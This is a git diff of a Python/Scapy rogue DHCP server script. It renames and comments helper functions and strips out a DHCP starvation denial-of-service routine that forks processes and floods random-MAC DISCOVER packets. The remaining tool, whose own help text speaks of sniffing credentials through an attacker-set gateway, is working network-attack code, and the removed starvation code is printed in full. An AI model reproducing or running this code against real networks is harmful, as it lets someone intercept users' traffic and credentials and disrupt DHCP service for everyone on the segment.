@@ -29,7 +29,7 @@ class DHCPListener:
         self.__DHCPServerIp = get_if_addr(conf.iface)
         self.__DHCPMac = Ether().src
         self.__dictIPS = {}
-        self.__IPPool = self.getIPPool("192.168.0.101-200")
+        self.__IPPool = self.getIPPoolbyRange("192.168.0.101-200")
 
         self.__fakeDNSServer = "8.8.8.8"
         self.__fakeSubnetMask = ""
@@ -48,7 +48,8 @@ class DHCPListener:
     def setIPPool(self, IPPool):
         self.__IPPool = IPPool
 
-    def getIPPool(self, iprange):
+    # Return a list of IP address given a range
+    def getIPPoolbyRange(self, iprange):
         return self.returnRange(iprange)
 
     @staticmethod
@@ -60,6 +61,7 @@ class DHCPListener:
             ip += str(i) + "."
         return ip
 
+    # Remove last number of an IP address. Ex: For 192.168.0.100 return 192.168.0.
     def returnRange(self, iprange):
         listIP = iprange.split("-")
         maxIP = self.getIpRangeIterator(listIP[0])
@@ -76,32 +78,9 @@ class DHCPListener:
             newList.append(index + str(x))
         return newList
 
-    # return a DHCP packet to send to the server (for DoS)
-    def generatePacketClient(self, type, mac):
-        return (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-                IP(src="0.0.0.0", dst="255.255.255.255") /
-                UDP(sport=68, dport=67) /
-                BOOTP(chaddr=mac) /
-                DHCP(options=[
-                    ('message-type', type),
-                    ("server_id", self.__GATEWAY_IP),
-                    "end"]))
-
-    # DoS to router -- DHCP starvation attack
-    def starvation(self, delay, iteration):
-        os.fork()
-        os.fork()
-        os.fork()
-        os.fork()
-        os.fork()
-        os.fork()
-        for i in range(iteration):
-            request = self.generatePacketClient("discover", RandMAC())
-            sendp(request)
-            time.sleep(int(delay))
-
     # Decode bytes in option to ascii
-    def getOption(self, dhcp_options, key):
+    @staticmethod
+    def getOption(dhcp_options, key):
         must_decode = ['hostname', 'domain', 'vendor_class_id']
         try:
             for i in dhcp_options:
@@ -174,21 +153,15 @@ class DHCPListener:
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="This script is a DCHP rogue server.")
+    parser = argparse.ArgumentParser(description="This script is a DHCP rogue server.")
     parser.add_argument("-d", "--dns", required=False, help="DNS IP")
     parser.add_argument("-m", "--netmask", required=True)
     parser.add_argument("-g", "--gateway", required=False,
                         help="Gateway IP for your attack (the IP in which you are going to sniff credentials). "
                              "Default is the same IP"
                              " that your DHCP server")
-    #############################################################################################################
     parser.add_argument("-x", "--iprange", required=False,
                         help="Range IP Ex: 192.168.0.1-45 ")
-    #############################################################################################################
-    parser.add_argument("-s", "--starvation", required=False, help="If we want to use the starvation function, "
-                                                                   "the argument you need to pass is the number of seconds "
-                                                                   "you want to delay the function")
-    parser.add_argument("-i", "--iteration", required=False, help="Number of fakes device to connect (only valid in conjuntion with -s)")
     args = parser.parse_args()
 
     DHCPListener = DHCPListener()
@@ -199,12 +172,6 @@ if __name__ == "__main__":
     DHCPListener.setSubnetMask(args.netmask)
     if args.iprange is not None:
         DHCPListener.setIPPool(args.iprange)
-    if args.starvation is not None:
-        if args.iteration is None:
-            iteration = 100
-        else:
-            iteration = args.iteration
-        DHCPListener.starvation(args.starvation, int(iteration))
 
     print("DHCP server in listening...")
     sniff(filter="udp and port 67", prn=DHCPListener.listener)
